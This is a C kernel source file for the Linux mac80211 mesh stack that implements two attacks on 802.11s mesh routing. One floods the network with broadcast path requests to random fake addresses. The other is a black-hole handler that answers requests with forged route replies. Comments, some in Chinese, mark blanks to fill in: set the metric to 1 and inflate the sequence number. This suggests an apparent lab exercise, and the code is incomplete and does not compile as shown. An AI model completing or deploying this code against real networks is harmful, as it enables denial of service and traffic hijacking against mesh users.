/*
 * =====================================================================================
 * 
 *       Filename:  mesh_attack.c
 *    Description:  mesh attack 
 *         Author:  Dennis (), shangxindu@gmail.com
 *
 * =====================================================================================
 */
#include "mesh.h"
#define CONFIG_MAC80211_MESH_ATTACK_DEBUG
#ifdef CONFIG_MAC80211_MESH_ATTACK_DEBUG
#define msatk_dbg(fmt, args...)   printk(KERN_DEBUG "Mesh attack: " fmt, ##args)
#else
#define msatk_dbg(fmt, args...)   do { (void)(0); } while (0)
#endif

#define MESH_PREQ_ATTACK_INTVL 10
#define default_lifetime(s) \
	MSEC_TO_TU(s->u.mesh.mshcfg.dot11MeshHWMPactivePathTimeout)
#define MSEC_TO_TU(x) (x*1000/1024)

static inline u32 u32_field_get(u8 *preq_elem, int offset, bool ae)
{
	if (ae)
		offset += 6;
	return get_unaligned_le32(preq_elem + offset);
}

/* Black hole attack IE processing macros */
#define AE_F			(1<<6)
#define AE_F_SET(x)		(*x & AE_F)
#define PREQ_IE_FLAGS(x)	(*(x))
#define PREQ_IE_HOPCOUNT(x)	(*(x + 1))
#define PREQ_IE_TTL(x)		(*(x + 2))
#define PREQ_IE_PREQ_ID(x)	u32_field_get(x, 3, 0)
#define PREQ_IE_ORIG_ADDR(x)	(x + 7)
#define PREQ_IE_ORIG_SN(x)	u32_field_get(x, 13, 0);
#define PREQ_IE_LIFETIME(x)	u32_field_get(x, 17, AE_F_SET(x));
#define PREQ_IE_METRIC(x) 	u32_field_get(x, 21, AE_F_SET(x));
#define PREQ_IE_TARGET_F(x)	(*(AE_F_SET(x) ? x + 32 : x + 26))
#define PREQ_IE_TARGET_ADDR(x) 	(AE_F_SET(x) ? x + 33 : x + 27)
#define PREQ_IE_TARGET_SN(x) 	u32_field_get(x, 33, AE_F_SET(x));


#define net_traversal_jiffies(s) \
	msecs_to_jiffies(s->u.mesh.mshcfg.dot11MeshHWMPnetDiameterTraversalTime)
#define default_lifetime(s) \
	MSEC_TO_TU(s->u.mesh.mshcfg.dot11MeshHWMPactivePathTimeout)
#define min_preq_int_jiff(s) \
	(msecs_to_jiffies(s->u.mesh.mshcfg.dot11MeshHWMPpreqMinInterval))
#define max_preq_retries(s) (s->u.mesh.mshcfg.dot11MeshHWMPmaxPREQretries)
#define disc_timeout_jiff(s) \
	msecs_to_jiffies(sdata->u.mesh.mshcfg.min_discovery_timeout)

struct mesh_attack_node{
	struct timer_list flood_timer;
	unsigned long data;                         /* data point */
};
//struct mesh_flood_node fnode;

int mesh_preq_flood_frame_tx(u8 * ,struct ieee80211_sub_if_data *);
u8 *target_addr_fake;
static const u8 broadcast_addr[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

u8 *mesh_attack_alloc()
{	
	u8 *p;
	p=kmalloc(6*sizeof(u8),GFP_KERNEL);
	if(!p)
	{
	msatk_dbg("can not alloc mem!\n");
		return NULL;
	}else 
		return p;
}


int mesh_attack_init(struct ieee80211_sub_if_data *sdata,struct mesh_flood_node * node )
{
	struct ieee80211_if_mesh * ifmsh=&sdata->u.mesh;
	target_addr_fake=mesh_attack_alloc();
	if(!target_addr_fake)
		return -ENOMEM;
	setup_timer(&ifmsh->mesh_flood_timer,       /* setup timer for flood attack */
			mesh_flood_timer,
			(unsigned long) sdata);
	node->last_flood=jiffies;
	node->count=0;

	/*-----------------------------------------------------------------------------
	 *  add one bit in work flags to open and close attack manually
	 *-----------------------------------------------------------------------------*/
	//blank
	set_bit(/*tobemodified*/,&ifmsh->wrkq_flags); /* black hole attack control bit */
	//blank
	msatk_dbg("flags:%lu",ifmsh->wrkq_flags);
	return 0;
}

void mesh_flood_timer(unsigned long data)
{
	struct ieee80211_sub_if_data *sdata =
		(struct ieee80211_sub_if_data *) data;
	struct ieee80211_if_mesh *ifmsh = &sdata->u.mesh;
	struct ieee80211_local *local = sdata->local;

	ieee80211_queue_work(&local->hw, &sdata->work);//ymjifmesh-->sdata
}

void process_flood_attack(struct mesh_flood_node * node,struct ieee80211_sub_if_data *sdata)
{
	if(time_after(jiffies,node->last_flood+msecs_to_jiffies(10)))
	{
		node->count++;
		get_random_bytes(target_addr_fake,6*sizeof(u8)); /* generate fake target address */
		msatk_dbg("Mesh flood test count %d\n",node->count);
		//msatk_dbg("generate random address: %pM\n",target_addr_fake);
		mesh_preq_flood_frame_tx(target_addr_fake,sdata);
		
	}
	
}

/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  mesh_preq_flood_frame_tx
 *  Description:  construct preq frame
 * =====================================================================================
 */
int mesh_preq_flood_frame_tx(u8 *target,struct ieee80211_sub_if_data *sdata)
{
	struct ieee80211_local *local = sdata->local;
	struct sk_buff *skb = dev_alloc_skb(local->hw.extra_tx_headroom + 400);
	struct ieee80211_mgmt *mgmt;
	u8 *pos;
	u8 flags=0;
	u8 *orig_addr=sdata->dev->dev_addr;
	__le32 orig_sn=0;
	//__le32 target_sn=0;
	u8 target_flags=0x2;                        /* MP_F_RF 0x02*/
	u8 *da=broadcast_addr;
	u8 hop_count=0;
	u8 ttl=32;
	//__le32 lifetime=default_lifetime(sdata);
	__le32 metric=0;
	__le32 preq_id=0;

	int ie_len;

	if (!skb)
		return -1;
	skb_reserve(skb, local->hw.extra_tx_headroom);
	/* 25 is the size of the common mgmt part (24) plus the size of the
	 * common action part (1)
	 */
	mgmt = (struct ieee80211_mgmt *)
		skb_put(skb, 25 + sizeof(mgmt->u.action.u.mesh_action));
	memset(mgmt, 0, 25 + sizeof(mgmt->u.action.u.mesh_action));
	mgmt->frame_control = cpu_to_le16(IEEE80211_FTYPE_MGMT |
					  IEEE80211_STYPE_ACTION);

	memcpy(mgmt->da, da, ETH_ALEN);
	memcpy(mgmt->sa, sdata->dev->dev_addr, ETH_ALEN);
	/* BSSID == SA */
	memcpy(mgmt->bssid, sdata->dev->dev_addr, ETH_ALEN);
	mgmt->u.action.category = MESH_PATH_SEL_CATEGORY;
	mgmt->u.action.u.mesh_action.action_code = MESH_PATH_SEL_ACTION;

	msatk_dbg("sending PREQ to %pM\n", target);
	ie_len = 37;
	pos = skb_put(skb, 2 + ie_len);
	*pos++ = WLAN_EID_PREQ;
	
	*pos++ = ie_len;
	*pos++ = flags;
	*pos++ = hop_count;
	*pos++ = ttl;
	memcpy(pos, &preq_id, 4);
	pos += 4;
	memcpy(pos, orig_addr, ETH_ALEN);
	pos += ETH_ALEN;
	memcpy(pos, &orig_sn, 4);
	pos += 4;
	memcpy(pos, &metric, 4);
	pos += 4;
		/* destination count */
	*pos++ = 1;
	*pos++ = target_flags;
	
	ieee80211_tx_skb(sdata, skb);
	return 0;
}


void hwmp_preq_frame_bh_process(struct ieee80211_sub_if_data *sdata,
				    struct ieee80211_mgmt *mgmt,
				    u8 *preq_elem, u32 metric)
{
	struct ieee80211_if_mesh *ifmsh = &sdata->u.mesh;
	u8 *target_addr, *orig_addr;
	u8 target_flags, ttl;
	u32 orig_sn, target_sn, lifetime;
	bool reply = true;

	/* Update target SN, if present */
	target_addr = PREQ_IE_TARGET_ADDR(preq_elem);
	orig_addr = PREQ_IE_ORIG_ADDR(preq_elem);
	target_sn = PREQ_IE_TARGET_SN(preq_elem);
	orig_sn = PREQ_IE_ORIG_SN(preq_elem);
	target_flags = PREQ_IE_TARGET_F(preq_elem);

	msatk_dbg("received PREQ from %pM for %pM\n", orig_addr,target_addr);

	if (memcmp(target_addr, sdata->dev->dev_addr, ETH_ALEN) == 0) {
		msatk_dbg("PREQ is for us, send regular prep\n");
		metric = 0;
		if (time_after(jiffies, ifmsh->last_sn_update +
					net_traversal_jiffies(sdata)) ||
		    time_before(jiffies, ifmsh->last_sn_update)) {
			target_sn = ++ifmsh->sn;
			ifmsh->last_sn_update = jiffies;
		}
	} else 
		//blank
		//to be modified
		//metric置为1
		//blank
	if (reply) {
		lifetime = PREQ_IE_LIFETIME(preq_elem);
		ttl = ifmsh->mshcfg.dot11MeshTTL;
		//blank
		//to be modified
		//sn比正常值多加1
		//blank
		if(ttl!=0)
		{
			//msatk_dbg("replying fake PREP to %pM with sn=%lu",target_addr,target_sn);
			mesh_path_sel_frame_tx(MPATH_PREP, 0, target_addr,
				cpu_to_le32(target_sn), 0, orig_addr,
				cpu_to_le32(orig_sn), mgmt->sa, 0, ttl,
				cpu_to_le32(lifetime), cpu_to_le32(metric),
				0, sdata);
		} else
			ifmsh->mshstats.dropped_frames_ttl++;
	}
}



